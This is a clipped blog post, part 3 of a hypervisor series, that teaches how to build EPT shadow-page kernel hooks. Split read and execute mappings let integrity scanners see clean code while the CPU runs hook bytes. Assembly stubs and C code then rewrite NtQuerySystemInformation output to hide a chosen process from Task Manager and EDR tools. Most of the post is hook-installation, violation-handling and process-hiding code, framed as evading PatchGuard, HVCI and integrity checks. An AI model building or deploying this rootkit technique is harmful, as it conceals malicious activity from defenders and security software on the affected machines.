---
title: "[Hypervisor Part 3] Making Your Kernel Hook Invisible with EPT Shadow Pages"
source: https://dkom.dev/posts/hypervisor-ept-hooks/
source_host: dkom.dev
clip_date: 2026-11-16T10:40:30+08:00
trace_id: 13911854-09f8-4236-92c5-d5b611c19134
content_hash: 1577583a8edab794ab0d20fabb220b08dce2943d8b2c62b75163ebb5199e9cb0
status: synced
tags: []
series: null
feed_source: dkom.dev·Windows内核/Hypervisor
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41a75244-d011-81f5-869b-e6eebb193fb0
ioc: null
---

[Part 1](https://dkom.dev/posts/hypervisor-primer/) introduced the hypervisor architecture. [Part 2](https://dkom.dev/posts/hypervisor-exit-handler/) covered the detour, hypercall ABI, and cross-process memory via CR3. This post covers what we actually *do* with that infrastructure: EPT shadow page hooks that hide kernel modifications from every integrity scanner running inside the guest.

## What an EPT shadow page hook is

EPT (Extended Page Tables) is the second stage of memory translation that the CPU applies when a guest OS is running under a hypervisor. The guest manages its own page tables (guest virtual → guest physical). The hypervisor manages EPT (guest physical → host physical). Every memory access in the guest goes through both.

The insight: EPT is per-hypervisor, not per-process. Guest software, including the Windows kernel, cannot see or modify EPT entries. But we can, from our hypervisor code.

A shadow page hook creates a **split view** of a single guest-physical page:

-   When the guest **reads** the page (checking code integrity, walking the IAT, verifying a pointer), it sees the **original, unmodified bytes**. EPT maps the read access to the real physical frame.
-   When the guest **executes** the page, EPT maps it to a **shadow frame** containing our hook bytes.

An integrity scanner calling `ReadProcessMemory` on `ntoskrnl.exe`, computing a hash of the function it thinks we hooked, sees clean code. The CPU, when it fetches instructions from the same virtual address, executes our hook. The two views coexist.

EPT shadow page hook: same guest PA, two host PA mappings Guest VA 0xfffff8xxx NtQuerySystemInformation guest page tables Guest PA 0x12345000 single guest-physical frame EPT: read access (R bit set, X bit clear) EPT: execute access (X bit set, R bit clear) Host PFN: original unmodified function bytes scanner reads → hash is clean Host PFN: shadow JMP pre_stub at offset 0 CPU executes → our hook runs EPT violation fires when access doesn't match permission bits → VMM swaps PFN mapping → VMRESUME → access retried handle_slat_violation() read on shadow PFN → swap to original; execute on original → swap to shadow

## The hook_entry_t structure

Every hooked page is tracked by a compact bitfield struct. We pack everything into 8 bytes to keep the hook table cache-friendly:

```cpp
// Compact hook descriptor -- 8 bytes total
// Sits in a flat array indexed by guest PFN; lookup is O(1)
struct hook_entry_t {
    uint64_t original_pfn    : 24;  // host PFN of unmodified page (max 64 GB)
    uint64_t shadow_pfn      : 24;  // host PFN of shadow page with hook bytes
    uint64_t access_mask     : 3;   // current EPT permission bits (R/W/X)
    uint64_t hooked          : 1;   // 1 = this entry is active
    uint64_t has_pre_stub    : 1;   // 1 = pre_stub allocated for this hook
    uint64_t has_post_stub   : 1;   // 1 = post_stub allocated
    uint64_t reserved        : 10;  // padding to 64 bits
};
```

24-bit PFNs support up to 64 GB of host physical memory per field (2^24 pages × 4 KB = 64 GB). The `access_mask` reflects the current EPT permission bits; the hypervisor updates this on every EPT violation so it knows what to swap.

## Installing a hook

Installing a shadow page hook involves four steps: allocate a shadow page, write the hook bytes, build the EPT split, and register the entry.

```c
NTSTATUS add_slat_code_hook(
    uint64_t target_guest_pa,   // guest-physical address to hook
    uint64_t hook_fn_hpa,       // host-physical address of our replacement function
    uint64_t pre_stub_hpa,      // host-physical address of pre-call stub
    uint64_t post_stub_hpa)     // host-physical address of post-call stub
{
    uint64_t target_pfn  = target_guest_pa >> 12;
    uint64_t page_offset = target_guest_pa & 0xFFF;

    // 1. Allocate shadow page, copy original content
    uint64_t shadow_hpa   = alloc_host_page();
    uint64_t original_hpa = ept_get_mapping(target_pfn);  // current EPT mapping
    memcpy(hpa_to_va(shadow_hpa), hpa_to_va(original_hpa), 0x1000);

    // 2. Write a 14-byte absolute JMP at page_offset in the shadow page
    //    FF 25 00 00 00 00 [8-byte absolute addr] = JMP [rip+0]
    uint8_t *patch_site = (uint8_t *)hpa_to_va(shadow_hpa) + page_offset;
    uint8_t jmp14[14] = {0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0,0,0,0,0,0,0,0};
    *(uint64_t *)(jmp14 + 6) = pre_stub_guest_va(pre_stub_hpa);
    memcpy(patch_site, jmp14, 14);

    // 3. Split the EPT entry
    //    Execute access → shadow page (hook bytes)
    //    Read/write access → original page (clean bytes)
    /* Requires IA32_VMX_EPT_VPID_CAP bit 0 set; if absent, use RW original + RWX shadow instead */
    ept_set_mapping(target_pfn, shadow_hpa, EPT_X);
    ept_set_read_mapping(target_pfn, original_hpa);

    // 4. Register in hook table
    hook_table[target_pfn] = (hook_entry_t){
        .original_pfn  = original_hpa >> 12,
        .shadow_pfn    = shadow_hpa >> 12,
        .access_mask   = EPT_X,
        .hooked        = 1,
        .has_pre_stub  = (pre_stub_hpa != 0),
        .has_post_stub = (post_stub_hpa != 0),
    };

    // 5. Invalidate EPT TLB so the change takes effect immediately
    ept_invalidate(target_pfn);
    return STATUS_SUCCESS;
}
```

The key detail is `ept_set_mapping` vs `ept_set_read_mapping`. EPT controls Read, Write, and Execute independently. We start with the mapping at `EPT_X` (execute only, shadow page). Any read access fires an EPT violation, which swaps to the original before the read completes.

## Handling EPT violations

Every split-page access that doesn’t match the current permission bits causes an EPT violation VM-exit. `handle_slat_violation()` (called from the detour in Part 2) reads the exit qualification and flips the mapping:

```c
void handle_slat_violation(void)
{
    // Intel SDM: EPT violation qualification (VMCS 0x6400), guest physical addr (0x2400)
    uint64_t qual       = vmread(VMCS_EXIT_QUALIFICATION);
    uint64_t guest_pa   = vmread(VMCS_GUEST_PHYSICAL_ADDR);
    uint64_t target_pfn = guest_pa >> 12;

    hook_entry_t *entry = &hook_table[target_pfn];
    if (!entry->hooked) {
        inject_page_fault(guest_pa);
        return;
    }

    // Qualification bits: bit 0 = read, bit 1 = write, bit 2 = execute
    bool is_execute = (qual & 4) != 0;

    if (is_execute) {
        // Execute access: switch to shadow page (hook bytes)
        /* Requires IA32_VMX_EPT_VPID_CAP bit 0 set; if absent, use RW original + RWX shadow instead */
        ept_set_mapping(target_pfn, (uint64_t)entry->shadow_pfn << 12, EPT_X);
        entry->access_mask = EPT_X;
    } else {
        // Read/write access: switch to original page (clean bytes)
        ept_set_mapping(target_pfn, (uint64_t)entry->original_pfn << 12, EPT_R | EPT_W);
        entry->access_mask = EPT_R | EPT_W;
    }

    ept_invalidate(target_pfn);
    // Caller does VMRESUME -- the faulting access is retried immediately
}
```

One EPT violation fires per transition between read-mode and execute-mode for a given page. In normal operation (code running, no concurrent integrity scan), the page stays in `EPT_X` mode and no violations occur. The overhead shows up only when a scanner reads the page.

## Pre and post stubs

The shadow page JMPs to a pre-stub that runs before our hook logic. The stub saves registers and records the call context keyed by CR3 (current page directory base register, which identifies the process address space and is stable across VP migrations):

```nasm
; pre_stub for NtQuerySystemInformation hook
pre_stub:
    push    rax
    push    rcx
    push    rdx
    push    r8
    push    r9
    push    r10
    push    r11

    ; Save SystemInformationClass (rcx) so post-stub can decide whether to sanitise
    mov     rax, rcx

    ; Pre-notify hypercall: CPUID with packed hypercall_info_t in RCX
    ; RDX = current CR3 (process identity for pairing with post-stub)
    ; R8  = arg0 (SystemInformationClass)
    ; R9  = return address (so post-stub can restore it)
    mov     rdx, cr3
    mov     r8,  rax
    mov     r9,  [rsp + 0x38]          ; saved return address (above pushed regs)
    mov     ecx, HYPERCALL_HOOK_PRE    ; packed hypercall_info_t value
    cpuid                              ; → VM-exit → hook_pre_notify(cr3, arg0, ret_addr)

    ; Swap return address → post_stub so we intercept the function's return
    lea     rax, [rip + post_stub]
    mov     [rsp + 0x38], rax

    pop     r11
    pop     r10
    pop     r9
    pop     r8
    pop     rdx
    pop     rcx
    pop     rax

    jmp     [rip + trampoline_ptr]     ; → original function (stolen bytes + JMP back)
```

The post-stub runs where the original function would have returned. At that point, `NtQuerySystemInformation` has already filled the caller’s buffer:

```nasm
post_stub:
    push    rax    ; save return value (NTSTATUS)
    push    rcx
    push    rdx

    ; Post-notify hypercall: hypervisor looks up context by CR3,
    ; reads SystemInformationLength from saved args,
    ; calls sanitise_process_info() on the output buffer
    mov     rdx, cr3
    mov     ecx, HYPERCALL_HOOK_POST
    cpuid          ; → VM-exit → handle post-hook sanitisation

    pop     rdx
    pop     rcx
    pop     rax

    jmp     [rip + original_return_ptr]   ; back to original caller
```

## Sanitising NtQuerySystemInformation

`NtQuerySystemInformation(SystemProcessInformation=5)` returns a flat buffer of `SYSTEM_PROCESS_INFORMATION` structures linked by `NextEntryOffset`. This is what Task Manager, Process Explorer, and every EDR process enumerator reads.

The relevant fields:

```c
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG          NextEntryOffset;   // byte offset to next entry; 0 = last
    ULONG          NumberOfThreads;
    // ... several timing/stat fields ...
    UNICODE_STRING ImageName;
    KPRIORITY      BasePriority;
    HANDLE         UniqueProcessId;
    // ...
} SYSTEM_PROCESS_INFORMATION;
```

Removing a process from the list means stitching over it: the previous entry’s `NextEntryOffset` needs to skip the target entry entirely.

```c
void sanitise_process_info(uint64_t buffer_gva, uint32_t buf_size,
                           uint32_t target_pid, uint64_t guest_cr3)
{
    uint64_t cursor    = buffer_gva;
    uint64_t prev_gva  = 0;   // GVA of previous entry (for stitching)
    uint32_t prev_next = 0;   // previous entry's NextEntryOffset value

    while (1) {
        SYSTEM_PROCESS_INFORMATION entry;
        if (!read_guest_virtual_memory(&entry, cursor, guest_cr3, sizeof(entry)))
            break;

        uint32_t next_off = entry.NextEntryOffset;
        uint32_t pid      = (uint32_t)(uintptr_t)entry.UniqueProcessId;

        if (pid == target_pid) {
            uint32_t new_off;
            if (prev_gva == 0) {
                // Target is the head entry -- move the second entry to position 0
                // by adjusting the caller's buffer pointer (done via a separate
                // hypercall that modifies the guest register holding the buffer base).
                // Elided here; in practice the head case is handled separately.
            } else {
                // Middle or tail: update prev->NextEntryOffset to skip us
                // If we are the last entry (next_off==0), set prev's offset to 0
                new_off = (next_off == 0) ? 0 : (prev_next + next_off);
                write_guest_virtual_memory(
                    prev_gva,           // address of prev->NextEntryOffset
                    &new_off,
                    guest_cr3,
                    sizeof(new_off));
            }
            return;
        }

        if (next_off == 0) break;
        prev_gva  = cursor;          // address of this entry's NextEntryOffset field
        prev_next = next_off;
        cursor   += next_off;
    }
}
```

`read_guest_virtual_memory` and `write_guest_virtual_memory` are the Part 2 cross-process memory primitives: they translate guest virtual addresses through the provided CR3 using EPT. The buffer is in user-mode memory; the kernel has already written it by the time `NtQuerySystemInformation` returns. We modify it in the post-stub hypercall, in-flight, before control returns to the caller.

## CR3 keying for pre/post pairing

The context table is indexed by CR3, not VP index, because threads migrate between virtual processors. A VP-keyed table breaks when a thread switches VPs between the pre and post stubs. CR3 identifies the address space and is stable for the lifetime of the process:

```c
#define MAX_CONCURRENT_HOOKS 64

struct hook_context_t {
    uint64_t cr3;
    uint64_t arg0;          // SystemInformationClass (or equivalent first arg)
    uint64_t return_addr;   // original return address, restored by post-stub
    uint64_t in_use;
};

static hook_context_t g_hook_contexts[MAX_CONCURRENT_HOOKS];

void hook_pre_notify(uint64_t cr3, uint64_t arg0, uint64_t return_addr)
{
    for (int i = 0; i < MAX_CONCURRENT_HOOKS; i++) {
        if (!g_hook_contexts[i].in_use) {
            g_hook_contexts[i] = (hook_context_t){cr3, arg0, return_addr, 1};
            return;
        }
    }
    // Table full -- drop; post-stub finds no entry and skips sanitisation
}

hook_context_t *hook_post_get_and_clear(uint64_t cr3)
{
    for (int i = 0; i < MAX_CONCURRENT_HOOKS; i++) {
        if (g_hook_contexts[i].in_use && g_hook_contexts[i].cr3 == cr3) {
            g_hook_contexts[i].in_use = 0;
            return &g_hook_contexts[i];
        }
    }
    return NULL;
}
```

64 concurrent contexts is conservative. `NtQuerySystemInformation` calls for a process list don’t overlap in practice, but concurrent calls from different processes do stack up.

**Known limitation:** a CR3-keyed table races on same-process concurrent threads. Two threads in the same process share one CR3, so a second concurrent call can collide with or evict the first entry. Key by `(CR3, return address)` to eliminate the race, or document it as out-of-scope for the current implementation.

## What HVCI stops and what it doesn’t

HVCI enforces W^X in kernel memory via EPT: kernel pages cannot be simultaneously writable and executable, and new executable kernel mappings require code signed and verified in VTL1. It does not affect EPT entries written by the hypervisor itself. The shadow page is a host-physical allocation made by the hypervisor; HVCI has no authority over it. EPT entries are written by the hypervisor. Guest-mode code can’t even read them.

This is the structural advantage of operating from below the guest OS. Guest-side security mechanisms (HVCI, Kernel Patch Protection (PatchGuard), object callback validation, code integrity checks) all run as guest software and can only see the view of memory that EPT allows them to see. They cannot check what they cannot read.

* * *

That’s the full series. [Part 1](https://dkom.dev/posts/hypervisor-primer/) establishes the model. [Part 2](https://dkom.dev/posts/hypervisor-exit-handler/) builds the detour and hypercall ABI. This post builds the stealth hooks on top of that infrastructure.

There’s more to a production implementation: EPT table management, TLB shootdowns across VPs, large page handling, and identity-mapped regions all add complexity. But the core mechanism is exactly what’s described here: split EPT, two PFNs, swap on violation, sanitise in post-stub.
